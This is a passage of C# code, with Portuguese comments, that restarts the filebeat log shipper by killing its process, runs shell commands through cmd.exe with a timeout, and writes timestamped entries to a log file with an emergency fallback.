        {
            try
            {
                Log("Restarting filebeat...");
                
                // Matar processo
                Process[] procs = Process.GetProcessesByName("filebeat");
                foreach (Process p in procs)
                {
                    try
                    {
                        p.Kill();
                        p.WaitForExit(5000);
                    }
                    catch { }
                }
                
                Thread.Sleep(2000);
                
                // Filebeat deve reiniciar automaticamente como serviço
                Log("Filebeat killed, should restart automatically");
            }
            catch (Exception ex)
            {
                Log("Restart filebeat error: " + ex.Message);
            }
        }
        
        // ==================== RUN COMMAND ====================
        static void RunCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + command;
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                
                Process proc = Process.Start(psi);
                proc.WaitForExit(10000); // 10 second timeout
                
                if (proc.ExitCode != 0)
                {
                    string error = proc.StandardError.ReadToEnd();
                    Log("Command failed: " + command + " - Error: " + error);
                }
            }
            catch (Exception ex)
            {
                Log("RunCommand exception: " + command + " - " + ex.Message);
            }
        }
        
        // ==================== LOGGING ====================
        static void Log(string message)
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string logEntry = "[" + timestamp + "] " + message;
                File.AppendAllText(LOG_FILE, logEntry + "\n");
            }
            catch
            {
                // Se log falhar, tentar emergency log
                EmergencyLog(message);
            }
        }
        
        static void EmergencyLog(string message)
        {
            try
            {
                string emergencyLog = "C:\\EMERGENCY.txt";
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string logEntry = "[" + timestamp + "] " + message;
                File.AppendAllText(emergencyLog, logEntry + "\n");
            }
            catch
            {
                // Se até emergency log falhar, ignorar
            }
        }
    }
}